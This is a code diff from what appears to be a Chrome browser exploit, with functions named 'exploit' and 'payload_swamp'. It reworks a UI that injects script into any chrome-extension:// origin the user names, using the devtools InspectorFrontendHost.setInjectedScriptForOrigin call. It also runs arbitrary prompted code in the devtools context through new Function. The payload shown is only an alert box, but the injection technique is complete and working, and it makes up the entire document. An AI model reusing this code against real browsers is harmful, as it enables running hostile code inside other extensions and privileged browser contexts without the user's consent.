@@ -44,51 +44,54 @@ wss.on("connection", function connection(wss_con) {
 
             window.w = w;
 
-            
+
             function exploit(w) {
 
-               
+
                 function ui() {
                     function payload_swamp(w) {
                         w.alert("Hello world from " + w.origin);
                     }
                     document.open();
                     document.write(`
-                        <p> Press q for evaluating code under extension id </p>
-                        <p> Press m for evaluating under devtools context </p>
+                        <p> Press q for evaluating code under <a id="extdbg"> extension id</a> </p>
+                        <p> Press m for evaluating under <a id="devdbg">devtools </a> context </p>
                         <p> Typing 'cancel' in any prompt will cancel the current operation. </p>
+                        
                     `)
-                    onkeydown = function(ev) {
-                        if (ev.key.toLowerCase() === "m") {
-                            var l_canceled = false;
-                            const id = setTimeout(function m() {
-                                if (l_canceled) return;
-                                (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
-                                if (!l_canceled) setTimeout(m, 0);
-                                clearTimeout(id);
-                            });
-                            Object.defineProperty(window, 'cancel', {
-                                get: function() {
-                                    l_canceled = true;
-                                }, configurable: true
-                            })
-                            return;
-                        }
-                        if (ev.key.toLowerCase() === 'q') {
-                            let x = null;
-                            while (!x) {
-                                x = prompt('Extension id?');
-                                if (x === "cancel") {
-                                    return;
-                                }
+                    document.close();
+                    document.querySelector('#extdbg').onclick = function() {
+                        let x = null;
+                        while (!x) {
+                            x = prompt('Extension id?');
+                            if (x === "cancel") {
+                                return;
                             }
-                            const URL_1 = `chrome-extension://${ x ?? 
-alert("NOTREACHED")}/manifest.json`;
-                            InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w)} //`);
-                            const ifr = document.createElement("iframe");
-                            ifr.src = URL_1;
-                            document.body.appendChild(ifr);
                         }
+                        const URL_1 = `chrome-extension://${x ??
+                            alert("NOTREACHED")}/manifest.json`;
+                        InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w)} //`);
+                        const ifr = document.createElement("iframe");
+                        ifr.src = URL_1;
+                        document.body.appendChild(ifr);
+                        setTimeout(function() {
+                            ifr.remove();
+                        }, 500);
+                    }
+                    document.querySelector('#devdbg').onclick = function () {
+                        var l_canceled = false;
+                        const id = setTimeout(function m() {
+                            if (l_canceled) return;
+                            (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
+                            if (!l_canceled) setTimeout(m, 0);
+                            clearTimeout(id);
+                        });
+                        Object.defineProperty(window, 'cancel', {
+                            get: function() {
+                                l_canceled = true;
+                            }, configurable: true
+                        })
+                        return;
                     }
                 }
                 w.eval(`(${ui.toString()})()`);
